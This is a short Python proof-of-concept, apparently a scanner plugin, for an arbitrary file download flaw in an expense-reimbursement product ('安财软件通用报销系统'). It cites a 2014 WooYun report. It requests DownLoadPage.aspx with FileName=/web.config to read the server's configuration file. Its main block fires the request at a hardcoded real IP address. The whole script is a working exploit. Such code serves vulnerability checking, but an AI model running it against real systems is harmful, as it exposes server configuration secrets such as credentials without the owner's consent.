#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 安财软件通用报销系统任意文件下载
#Refer:http://www.wooyun.org/bugs/wooyun-2014-064190
#Author:xq17
def assign(service, arg):
    if service == "acsoft":
        return True, arg

def audit(arg):
    payload = arg + "DownLoadPage.aspx?FileName=/web.config"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'system.web' in res:
         security_info(payload+':Any reading ' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('acsoft','http://122.224.179.212:8000/')[1])
